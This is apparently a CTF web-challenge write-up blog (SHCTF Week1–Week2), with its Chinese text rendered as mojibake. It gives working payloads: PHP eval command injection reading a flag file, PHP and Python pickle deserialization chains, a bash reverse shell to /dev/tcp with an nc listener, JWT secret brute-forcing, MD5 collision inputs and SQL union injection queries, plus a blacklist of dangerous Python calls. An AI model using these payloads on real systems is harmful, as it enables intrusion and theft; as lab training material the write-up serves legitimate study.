<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git diff 73beab9e53f96cb5d610ee2e95da714844f4cbb3</span><br></pre></td></tr></table></figure>

<p>æ‰¾åˆ°flag</p>
<h4 id="Week1-å•èº«åå…«å¹´çš„æ‰‹é€Ÿ"><a href="#Week1-å•èº«åå…«å¹´çš„æ‰‹é€Ÿ" class="headerlink" title="[Week1] å•èº«åå…«å¹´çš„æ‰‹é€Ÿ"></a>[Week1] å•èº«åå…«å¹´çš„æ‰‹é€Ÿ</h4><p><img src="https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202410062051642.png" alt="image-20241006205113566" loading="lazy"></p>
<p>æˆ‘ä»¬æ‰“å¼€é¡µé¢å‘ç°è¦æ±‚ç‚¹å‡»520æ¬¡å°±å¯è·å¾—flagï¼Œä¸€çœ‹åˆæ˜¯ä¸ªjsçš„é¢˜ï¼Œä½†æˆ‘ä»¬åœ¨game.jsç›´æ¥å°±æ‰¾åˆ°äº†flagçš„base64ç¼–ç ï¼Œè§£ç å¾—åˆ°flag</p>
<p><img src="https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202410062052889.png" alt="image-20241006205214814" loading="lazy"></p>
<h4 id="Week1-è›è›-è›è›"><a href="#Week1-è›è›-è›è›" class="headerlink" title="[Week1] è›è›?è›è›!"></a>[Week1] è›è›?è›è›!</h4><p>æˆ‘ä»¬æ‰“å¼€æºä»£ç ï¼Œå‘ç°æœ‰ä¸ªæç¤º</p>
<p><img src="https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202410062054069.png" alt="image-20241006205440029" loading="lazy"></p>
<p>æˆ‘ä»¬è®¿é—®source.txtï¼Œå‘ç°ä¸€ä¸²ä»£ç </p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">if($_GET[&#x27;ququ&#x27;] == 114514 &amp;&amp; strrev($_GET[&#x27;ququ&#x27;]) != 415411)&#123;</span><br><span class="line">    if($_POST[&#x27;ququ&#x27;]!=null)&#123;</span><br><span class="line">        $eval_param = $_POST[&#x27;ququ&#x27;];</span><br><span class="line">        if(strncmp($eval_param,&#x27;ququk1&#x27;,6)===0)&#123;</span><br><span class="line">            eval($_POST[&#x27;ququ&#x27;]);</span><br><span class="line">        &#125;else&#123;</span><br><span class="line">            echo(&quot;å¯ä»¥è®©faultçš„è›è›å˜æˆç°å®ä¹ˆ\n&quot;);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    echo(&quot;è›è›æˆåŠŸç¬¬ä¸€æ­¥ï¼\n&quot;);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">else&#123;</span><br><span class="line">    echo(&quot;å‘œå‘œå‘œfaultè¿˜æ˜¯è¦å‡ºé¢˜&quot;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>è¿›è¡Œä»£ç å®¡è®¡ï¼Œæˆ‘ä»¬å‘ç°getæäº¤çš„ququè¦ä¸º114514ï¼Œå®ƒçš„é€†å‘è¦ä¸ä¸º114514ï¼Œç”±äºæ˜¯å¼±æ¯”è¾ƒï¼Œæˆ‘ä»¬è®©</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ququ=114514.0å°±èƒ½ç»•è¿‡ç¬¬ä¸€ä¸ªif</span><br></pre></td></tr></table></figure>

<p>è€Œpostä¼ é€’çš„ququï¼Œå®ƒçš„å‰6ä¸ªå­—ç¬¦éœ€ä¸ºququk1</p>
<p>æˆ‘ä»¬ä½¿ç”¨?&gt;&lt;?phpæˆªæ–­evalå‡½æ•°ï¼Œå†é‡æ–°åˆ›ä¸ªsystemå‡½æ•°æ¥æ‰§è¡Œ</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ququk1; ?&gt;&lt;?php system(&quot;ls&quot;);</span><br></pre></td></tr></table></figure>

<p><img src="https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202410062113443.png" alt="image-20241006211310235" loading="lazy"></p>
<p>æˆåŠŸå¾—åˆ°ç›®å½•æ–‡ä»¶</p>
<p>ç„¶åæˆ‘ä»¬æ‰¾åˆ°flagæ‰€åœ¨ä½ç½®</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ququk1; ?&gt;&lt;?php system(&quot;ls ../../../&quot;);</span><br></pre></td></tr></table></figure>

<p><img src="https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202410062113507.png" alt="image-20241006211356292" loading="lazy"></p>
<p>å°†flagè¾“å‡ºå‡ºæ¥</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ququk1; ?&gt;&lt;?php system(&quot;cat ../../../flag&quot;);</span><br></pre></td></tr></table></figure>

<p>å°±å¾—åˆ°flagäº†</p>
<h4 id="Week1-poppopop"><a href="#Week1-poppopop" class="headerlink" title="[Week1] poppopop"></a>[Week1] poppopop</h4><p>ç®€å•çš„ååºåˆ—åŒ–</p>
<p>popé“¾</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class SH &#123;</span><br><span class="line"></span><br><span class="line">    public static $Web =true;</span><br><span class="line">    public static $SHCTF = true;</span><br><span class="line">&#125;</span><br><span class="line">class C &#123;</span><br><span class="line">    public $p;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">class T&#123;</span><br><span class="line"></span><br><span class="line">    public $n;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">class F &#123;</span><br><span class="line">    public $o;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">class SHCTF &#123;</span><br><span class="line">    public $isyou=&quot;system&quot;;</span><br><span class="line">    public $flag=&quot;cat ../../../flllag&quot;;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">$a=new T();</span><br><span class="line">$a-&gt;n=new F();</span><br><span class="line">$a-&gt;n-&gt;o=new C();</span><br><span class="line">$a-&gt;n-&gt;o-&gt;p=new SHCTF();</span><br><span class="line">echo base64_encode((serialize($a)));</span><br></pre></td></tr></table></figure>

<h4 id="Week1-MD5-Master"><a href="#Week1-MD5-Master" class="headerlink" title="[Week1] MD5 Master"></a>[Week1] MD5 Master</h4><p>md5	å¼ºç¢°æ’</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">highlight_file(__file__);</span><br><span class="line"></span><br><span class="line">$master = &quot;MD5 master!&quot;;</span><br><span class="line"></span><br><span class="line">if(isset($_POST[&quot;master1&quot;]) &amp;&amp; isset($_POST[&quot;master2&quot;]))&#123;</span><br><span class="line">    if($master.$_POST[&quot;master1&quot;] !== $master.$_POST[&quot;master2&quot;] &amp;&amp; md5($master.$_POST[&quot;master1&quot;]) === md5($master.$_POST[&quot;master2&quot;]))&#123;</span><br><span class="line">        echo $master . &quot;&lt;br&gt;&quot;;</span><br><span class="line">        echo file_get_contents(&#x27;/flag&#x27;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">else&#123;</span><br><span class="line">    die(&quot;master? &lt;br&gt;&quot;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>æˆ‘ä»¬æ¥å®¡è®¡ä»£ç ï¼Œè¦ä¼ å…¥çš„maste1å’Œmaste2è·Ÿmasteræ‹¼æ¥çš„æ•°æ®ä¸åŒï¼Œä½†md5çš„å€¼è¦ç›¸åŒï¼Œä¸”ä¸ºmd5å¼ºç¢°æ’ï¼Œæˆ‘ä»¬ä½¿ç”¨fastcollæ¥ç”Ÿæˆä¸¤ä¸ªå‰ç¼€ä¸º <code>MD5 master!</code> ä¸”md5ä¸€æ ·çš„æ–‡ä»¶ã€‚</p>
<p><img src="https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202410242055752.png" alt="image-20241024205524693" loading="lazy"></p>
<p>æˆ‘ä»¬ä½¿ç”¨bpæˆ–hackbarå°†å€¼ä¼ ä¸Šå»</p>
<p>è¿™é‡Œéœ€è¦æ³¨æ„çš„ç»†èŠ‚æ˜¯ï¼Œç”¨hackerbarå‘é€æ—¶ï¼Œè¦åœ¨ç»“å°¾å¤šæ·»åŠ ä¸€ä¸ª <code>&amp;</code>ï¼Œå› ä¸ºhackerbarä¼šè‡ªåŠ¨æ¢è¡Œ</p>
<p>ç”¨bpå‘é€æ—¶ï¼Œè¦æŠŠæœ€åçš„ç©ºè¡Œåˆ é™¤ï¼Œä¸èƒ½æœ‰å¤šä½™çš„ä¸œè¥¿ï¼Œæˆ–è€…åœ¨ç»“å°¾å¤šæ·»åŠ ä¸€ä¸ª<code>&amp;</code></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">master1=%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00v%CE%0A%9F%DF%0FL%86%AF%DB%14%D4%250o%C6%C6%DB%5D%08%FC%8A%27%9F%1A%AA9F%11%FA%90%11%96%D5%02%E2%BC%D4%2B%1B%8B%06q%A1%17%16%7Fp%0B%3D%CD%5D%FFdu%13%F0%16%E0%ADx%D52%DEnD%FF%85%C6%8C%C3%10E%B2%11%C18%7CM%A8C%7E%BAWd%5B%C2%28%8D%C3+%C8%8B_%88%C8%CBs48%A7%06.TtI%CA%3A%3B%98%0E%9F%F5S%D4%D2%AE%A7q%839IW%A6%11%CF%8Cv&amp;master2=%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00v%CE%0A%9F%DF%0FL%86%AF%DB%14%D4%250o%C6%C6%DB%5D%88%FC%8A%27%9F%1A%AA9F%11%FA%90%11%96%D5%02%E2%BC%D4%2B%1B%8B%06q%A1%17%96%7Fp%0B%3D%CD%5D%FFdu%13%F0%16%E0-x%D52%DEnD%FF%85%C6%8C%C3%10E%B2%11%C18%7CM%A8C%7E%BA%D7d%5B%C2%28%8D%C3+%C8%8B_%88%C8%CBs48%A7%06.TtI%CA%3A%3B%18%0E%9F%F5S%D4%D2%AE%A7q%839IW%26%11%CF%8Cv</span><br></pre></td></tr></table></figure>

<p>å¾—åˆ°flag</p>
<p><img src="https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202410242056773.png" alt="image-20241024205613719" loading="lazy"></p>
<h4 id="Week2-ç™»å½•éªŒè¯"><a href="#Week2-ç™»å½•éªŒè¯" class="headerlink" title="[Week2]ç™»å½•éªŒè¯"></a>[Week2]ç™»å½•éªŒè¯</h4><p>é¢˜ç›®è¯´è·Ÿjwtæœ‰å…³ï¼Œé‚£æˆ‘ä»¬å…ˆç™»å½•</p>
<p>æˆ‘ä»¬å‘å…ˆ</p>
<p>å¯†ç ä¸æ˜¯adminä¼šå›æ˜¾é”™è¯¯å¯†ç ,è´¦å·ä¸æ˜¯adminä¼šå›æ˜¾â€ä½ ä¸æ˜¯adminâ€</p>
<p>éƒ½æ˜¯adminåå›æ˜¾â€ä½ ä¸æ˜¯çœŸæ­£çš„adminâ€,æ­¤æ—¶æŠ“åŒ…å¯ä»¥çœ‹åˆ°cookieå¤„æœ‰token</p>
<p><img src="https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202410241908643.png" alt="image-20241024190833511" loading="lazy"></p>
<p>æˆ‘ä»¬æŠŠtokenæ”¾åˆ°jwt.ioé‡Œå»è§£å¯†</p>
<p><img src="https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202410241908783.png" alt="image-20241024190859741" loading="lazy"></p>
<p>æˆ‘ä»¬å‘ç°è¿™ä¸ªroleæ˜¯userï¼Œæˆ‘ä»¬çŒœæµ‹è¦å°†å…¶æ”¹ä¸ºadminï¼Œä½†æ˜¯æˆ‘ä»¬éœ€è¦å¯†é’¥ï¼Œé¢˜ç›®æç¤ºå¯ä»¥çˆ†ç ´ï¼Œé‚£æˆ‘ä»¬ç”¨jwt-crackerçˆ†ç ´çœ‹çœ‹ï¼Œæ ¹æ®é¢˜ç›®æè¿°666666ï¼Œæˆ‘ä»¬çŒœæµ‹6ä½å¼±å¯†ç </p>
<p><img src="https://mmbiz.qpic.cn/sz_mmbiz_png/7qW6h4Sfy6DXkO0QiaOzfHZg049wIQHicnMiaQLianWsb9jbTHXy0xsJjohqzl3dxT8xXZd00Fs4KQypQ0yWtJUt9Q/640?wx_fmt=png&from=appmsg&tp=webp&wxfrom=10005&wx_lazy=1&wx_co=1" alt="å›¾ç‰‡" loading="lazy"></p>
<p>çˆ†ç ´å‡ºæ¥å¯†ç ä¸º222333ï¼Œæˆ‘ä»¬å¼€å§‹ä¿®æ”¹jwt</p>
<p><img src="https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202410241934303.png" alt="image-20241024193417201" loading="lazy"></p>
<p>æˆ‘ä»¬å°†ä¿®æ”¹åçš„jwté‡æ–°ä¼ å…¥tokenä¸­ï¼Œåˆ·æ–°é¡µé¢ï¼Œå¾—åˆ°flag</p>
<p><img src="https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202410241939435.png" alt="image-20241024193912384" loading="lazy"></p>
<h4 id="Week2-dickle"><a href="#Week2-dickle" class="headerlink" title="[Week2]dickle"></a>[Week2]dickle</h4><p>é¢˜ç›®æç¤ºè¯´æ˜¯pä¸æ˜¯dï¼Œé‚£å°±æ˜¯pickleååºåˆ—åŒ–äº†</p>
<p>æˆ‘ä»¬æŸ¥çœ‹æºç </p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line">from flask import Flask, request</span><br><span class="line">import pickle</span><br><span class="line">import base64</span><br><span class="line">import io</span><br><span class="line"></span><br><span class="line">BLACKLISTED_CLASSES = [</span><br><span class="line">    &#x27;subprocess.check_output&#x27;,&#x27;builtins.eval&#x27;,&#x27;builtins.exec&#x27;,</span><br><span class="line">    &#x27;os.system&#x27;, &#x27;os.popen&#x27;, &#x27;os.popen2&#x27;, &#x27;os.popen3&#x27;, &#x27;os.popen4&#x27;, </span><br><span class="line">    &#x27;pickle.load&#x27;, &#x27;pickle.loads&#x27;, &#x27;cPickle.load&#x27;, &#x27;cPickle.loads&#x27;, </span><br><span class="line">    &#x27;subprocess.call&#x27;, &#x27;subprocess.check_call&#x27;, &#x27;subprocess.Popen&#x27;, </span><br><span class="line">    &#x27;commands.getstatusoutput&#x27;, &#x27;commands.getoutput&#x27;, &#x27;commands.getstatus&#x27;, </span><br><span class="line">    &#x27;pty.spawn&#x27;, &#x27;posixfile.open&#x27;, &#x27;posixfile.fileopen&#x27;,</span><br><span class="line">    &#x27;__import__&#x27;,&#x27;os.spawn*&#x27;,&#x27;sh.Command&#x27;,&#x27;imp.load_module&#x27;,&#x27;builtins.compile&#x27;</span><br><span class="line">    &#x27;eval&#x27;, &#x27;builtins.execfile&#x27;, &#x27;compile&#x27;, &#x27;builtins.open&#x27;, &#x27;builtins.file&#x27;, &#x27;os.system&#x27;, </span><br><span class="line">    &#x27;os.fdopen&#x27;, &#x27;os.tmpfile&#x27;, &#x27;os.fchmod&#x27;, &#x27;os.fchown&#x27;, &#x27;os.open&#x27;, &#x27;os.openpty&#x27;, &#x27;os.read&#x27;, &#x27;os.pipe&#x27;,</span><br><span class="line">    &#x27;os.chdir&#x27;, &#x27;os.fchdir&#x27;, &#x27;os.chroot&#x27;, &#x27;os.chmod&#x27;, &#x27;os.chown&#x27;, &#x27;os.link&#x27;, &#x27;os.lchown&#x27;, &#x27;os.listdir&#x27;,</span><br><span class="line">    &#x27;os.lstat&#x27;, &#x27;os.mkfifo&#x27;, &#x27;os.mknod&#x27;, &#x27;os.access&#x27;, &#x27;os.mkdir&#x27;, &#x27;os.makedirs&#x27;, &#x27;os.readlink&#x27;, &#x27;os.remove&#x27;,</span><br><span class="line">    &#x27;os.removedirs&#x27;, &#x27;os.rename&#x27;, &#x27;os.renames&#x27;, &#x27;os.rmdir&#x27;, &#x27;os.tempnam&#x27;, &#x27;os.tmpnam&#x27;, &#x27;os.unlink&#x27;, &#x27;os.walk&#x27;,</span><br><span class="line">    &#x27;os.execl&#x27;, &#x27;os.execle&#x27;, &#x27;os.execlp&#x27;, &#x27;os.execv&#x27;, &#x27;os.execve&#x27;, &#x27;os.dup&#x27;, &#x27;os.dup2&#x27;, &#x27;os.execvp&#x27;, &#x27;os.execvpe&#x27;,</span><br><span class="line">    &#x27;os.fork&#x27;, &#x27;os.forkpty&#x27;, &#x27;os.kill&#x27;, &#x27;os.spawnl&#x27;, &#x27;os.spawnle&#x27;, &#x27;os.spawnlp&#x27;, &#x27;os.spawnlpe&#x27;, &#x27;os.spawnv&#x27;,</span><br><span class="line">    &#x27;os.spawnve&#x27;, &#x27;os.spawnvp&#x27;, &#x27;os.spawnvpe&#x27;, &#x27;pickle.load&#x27;, &#x27;pickle.loads&#x27;, &#x27;cPickle.load&#x27;, &#x27;cPickle.loads&#x27;,</span><br><span class="line">    &#x27;subprocess.call&#x27;, &#x27;subprocess.check_call&#x27;, &#x27;subprocess.check_output&#x27;, &#x27;subprocess.Popen&#x27;,</span><br><span class="line">    &#x27;commands.getstatusoutput&#x27;, &#x27;commands.getoutput&#x27;, &#x27;commands.getstatus&#x27;, &#x27;glob.glob&#x27;,</span><br><span class="line">    &#x27;linecache.getline&#x27;, &#x27;shutil.copyfileobj&#x27;, &#x27;shutil.copyfile&#x27;, &#x27;shutil.copy&#x27;, &#x27;shutil.copy2&#x27;, &#x27;shutil.move&#x27;,</span><br><span class="line">    &#x27;shutil.make_archive&#x27;, &#x27;popen2.popen2&#x27;, &#x27;popen2.popen3&#x27;, &#x27;popen2.popen4&#x27;, &#x27;timeit.timeit&#x27;, &#x27;sys.call_tracing&#x27;,</span><br><span class="line">    &#x27;code.interact&#x27;, &#x27;code.compile_command&#x27;, &#x27;codeop.compile_command&#x27;, &#x27;pty.spawn&#x27;, &#x27;posixfile.open&#x27;,</span><br><span class="line">    &#x27;posixfile.fileopen&#x27;</span><br><span class="line">]</span><br><span class="line"></span><br><span class="line">class SafeUnpickler(pickle.Unpickler):</span><br><span class="line">    def find_class(self, module, name):</span><br><span class="line">        print(f&#x27;find_class &#123;moudle&#125;.&#123;name&#125;&#x27;)</span><br><span class="line">        if f&quot;&#123;module&#125;.&#123;name&#125;&quot; in BLACKLISTED_CLASSES:</span><br><span class="line">            raise pickle.UnpicklingError(&quot;Forbidden class: %s.%s&quot; % (module, name))</span><br><span class="line">        return super().find_class(module, name)</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line">@app.route(&quot;/&quot;, methods=[&quot;GET&quot;, &quot;POST&quot;])</span><br><span class="line">def index():</span><br><span class="line">    if request.method == &quot;POST&quot;:</span><br><span class="line">        encoded_data = request.form[&quot;data&quot;]</span><br><span class="line">        decoded_data = base64.b64decode(encoded_data)</span><br><span class="line">        </span><br><span class="line">        try:</span><br><span class="line">            data_stream = io.BytesIO(decoded_data)</span><br><span class="line">            unpickler = SafeUnpickler(data_stream)</span><br><span class="line">            print(unpickler.load())</span><br><span class="line">            return f&quot;Deserialized data: &#123;list(result)&#125;&quot;</span><br><span class="line">        except Exception as e:</span><br><span class="line">            return f&quot;Error during deserialization: &#123;str(e)&#125;&quot;</span><br><span class="line">    else:</span><br><span class="line">        return &quot;&quot;&quot;</span><br><span class="line">        &lt;form method=&quot;post&quot;&gt;</span><br><span class="line">            &lt;label for=&quot;data&quot;&gt;Enter your serialized data:&lt;/label&gt;&lt;br&gt;</span><br><span class="line">            &lt;textarea id=&quot;data&quot; name=&quot;data&quot;&gt;&lt;/textarea&gt;&lt;br&gt;</span><br><span class="line">            &lt;input type=&quot;submit&quot; value=&quot;Submit&quot;&gt;</span><br><span class="line">        &lt;/form&gt;</span><br><span class="line">        &quot;&quot;&quot;</span><br><span class="line"></span><br><span class="line">if __name__ == &quot;__main__&quot;:</span><br><span class="line">    app.run(port=8080)</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>æˆ‘ä»¬çœ‹åˆ°é»‘åå•é‡Œè¿‡æ»¤äº†os.system</p>
<p>åœ¨ååºåˆ—åŒ–è¿‡ç¨‹ä¸­ï¼Œå¦‚æœ <code>pickle</code> æ¨¡å—é‡åˆ°ä¸€ä¸ªè¡¨ç¤ºç±»çš„æ ‡è®°ï¼Œå®ƒä¼šè°ƒç”¨ <code>find_class</code> æ–¹æ³•æ¥æŸ¥æ‰¾å’Œåˆ›å»ºç›¸åº”çš„ç±»å®ä¾‹ã€‚</p>
<p><code>find_class</code> æ–¹æ³•å°†è¯†åˆ«åˆ°çš„ <code>module</code> å’Œ <code>name</code> å–å†³äº <code>reduce</code> æ–¹æ³•è¿”å›çš„å†…å®¹ã€‚</p>
<p><code>module</code>æ˜¯ç±»çš„æ¨¡å—åï¼Œä¾‹å¦‚ â€œ<code>os</code>â€œã€‚<code>name</code>æ˜¯ç±»åï¼Œä¾‹å¦‚ â€œ<code>system</code>â€œ</p>
<p>æˆ‘ä»¬æœ¬åœ°è¿è¡ŒåŠ ä¸€ä¸ªæ‰“å°find_classçš„ç»“æœ</p>
<p><img src="https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202410242020742.png" alt="image-20241024202014650" loading="lazy"></p>
<p>åœ¨ååºåˆ—åŒ–è¿‡ç¨‹ä¸­ï¼Œ pickle ä½¿ç”¨ <code>find_class</code> æ–¹æ³•æ¥å®šä½å’Œå¯¼å…¥å¿…è¦çš„ç±»æˆ–å‡½æ•°ã€‚ç”±äº pickle è®°å½•çš„æ˜¯ <code>posix.system</code>ï¼Œå› æ­¤<code>find_class</code> ä¼šä» posix æ¨¡å—ä¸­å¯¼å…¥ system å‡½æ•°ï¼Œè€Œä¸æ˜¯ä» os æ¨¡å—ä¸­å¯¼å…¥ã€‚</p>
<p>æ‰€ä»¥å¯ä»¥ç”¨<code>os.system</code></p>
<p><img src="https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202410242020845.png" alt="image-20241024202032803" loading="lazy"></p>
<p>æˆ‘ä»¬è¿›è¡Œpickleååºåˆ—åŒ–</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">import base64</span><br><span class="line">import pickle</span><br><span class="line">import os</span><br><span class="line"></span><br><span class="line">class A(object):</span><br><span class="line">    def __reduce__(self):</span><br><span class="line">        return (os.system, (&quot;bash -c &#x27;bash -i &gt;&amp; /dev/tcp/ip/ç«¯å£ 0&gt;&amp;1&#x27;&quot;,))</span><br><span class="line">a = A()</span><br><span class="line">print( base64.b64encode( pickle.dumps(a) ) )</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>å…ˆç›‘å¬ç«¯å£</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">nc -lvvp ç«¯å£</span><br><span class="line"></span><br><span class="line">è‹¥å‡ºç°nc: getnameinfo: Temporary failure in name resolution</span><br><span class="line">ä½¿ç”¨ nc -lvnp ç«¯å£</span><br></pre></td></tr></table></figure>

<p>ç„¶åå°†ååºåˆ—åŒ–çš„ç»“æœä¼ ä¸Šå»åå¼¹shellï¼ŒæŸ¥æ‰¾flag</p>
<p><img src="https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202410242022040.png" alt="image-20241024202255967" loading="lazy"></p>
<h4 id="Week2-è‡ªåŠ©æŸ¥è¯¢"><a href="#Week2-è‡ªåŠ©æŸ¥è¯¢" class="headerlink" title="[Week2]è‡ªåŠ©æŸ¥è¯¢"></a>[Week2]è‡ªåŠ©æŸ¥è¯¢</h4><p>æˆ‘ä»¬ä½¿ç”¨1â€)å°±èƒ½å°†sqlè¯­å¥é—­åˆï¼Œç„¶åå°±æ˜¯æ­£å¸¸çš„sqlæ³¨å…¥è¿‡ç¨‹</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-1&quot;ï¼‰union select 1,database()#</span><br></pre></td></tr></table></figure>

<p> ctf</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-1&quot;) union select 1,group_concat(table_name) from information_schema.tables where table_schema=&quot;ctf&quot;#</span><br></pre></td></tr></table></figure>

<p>flag,users</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-1&quot;) union select 1,group_concat(column_name) from information_schema.columns where table_name=&quot;flag&quot;#</span><br></pre></td></tr></table></figure>

<p>id,scretdata</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-1&quot;) union select 1,group_concat(scretdata) from flag#</span><br></pre></td></tr></table></figure>

<p>è¢«ä½ æŸ¥åˆ°äº†, æœç„¶ä¸å®‰å…¨,æŠŠé‡è¦çš„ä¸œè¥¿å†™åœ¨æ³¨é‡Šå°±ä¸ä¼šå¿˜äº†</p>
<p>æˆ‘ä»¬å»æŸ¥æ‰¾åˆ—æ³¨é‡Š</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-1&quot;) union select 1,column_comment from information_schema.columns</span><br></pre></td></tr></table></figure>

<p>å¾—åˆ°flag</p>
<p><img src="https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202410242043580.png" alt="image-20241024204344539" loading="lazy"></p>
<h4 id="Week2-MD5-GOD"><a href="#Week2-MD5-GOD" class="headerlink" title="[Week2]MD5 GOD!"></a>[Week2]MD5 GOD!</h4><p>æˆ‘ä»¬å…ˆå¼€å§‹ä»£ç å®¡è®¡</p>
<p>æˆ‘ä»¬ç”±æºç å¯çŸ¥ï¼Œå½“64ä¸ªç”¨æˆ·ç­¾åˆ°æˆåŠŸåå³å¯å¾—åˆ°flag</p>
